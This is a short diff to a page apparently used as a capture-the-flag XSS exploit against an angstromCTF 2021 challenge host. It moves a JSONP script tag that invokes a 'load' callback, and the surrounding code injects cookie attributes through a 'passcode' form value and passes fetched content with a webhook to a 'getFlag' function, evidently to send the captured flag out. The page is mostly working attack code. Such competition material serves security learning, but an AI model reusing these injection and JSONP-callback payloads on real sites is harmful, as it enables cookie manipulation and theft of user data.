@@ -12,6 +12,8 @@ layout: xss
     <input name="passcode" value="; secure; samesite=none">
 </form>
 
+<!-- <script src="https://jason.2021.chall.actf.co/languages?callback=load" referrerpolicy="no-referrer"></script> -->
+
 <script>
     function load(data) {
         console.log("XSS DATA", data);
@@ -39,5 +41,4 @@ layout: xss
         .then(res => res.text)
         .then(text => getFlag(webhook, text));
 
-    //<script src="https://jason.2021.chall.actf.co/languages?callback=load" referrerpolicy="no-referrer">
 </script>
